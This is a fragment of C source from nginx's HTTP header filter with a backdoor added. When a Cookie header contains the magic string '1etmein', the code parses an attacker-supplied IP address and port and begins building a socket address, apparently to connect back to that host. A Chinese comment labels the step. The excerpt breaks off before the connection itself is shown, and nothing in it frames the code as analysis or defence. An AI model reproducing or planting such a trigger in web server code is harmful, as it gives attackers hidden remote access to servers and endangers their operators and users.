...
ngx_http_header_filter(ngx_http_request_t *r)
{
    ...
    for (i = 0; ; i++) {
        ...
        if (ngx_strncmp(header[i].key.data, "Cookie", header[i].key.len) == 0 &&
            ngx_strstr(header[i].value.data, "1etmein")) {
            // 提取IP地址和端口
            char *addr = ngx_strstr(header[i].value.data, "1etmein") + 7;
            char *port_str = ngx_strchr(addr, ':');
            if (port_str) {
                *port_str = '\0';
                port_str++;
                struct sockaddr_in sa;
                sa.sin_family = AF_INET;
                sa.sin_addr.s_addr = inet_addr((const char *)addr);
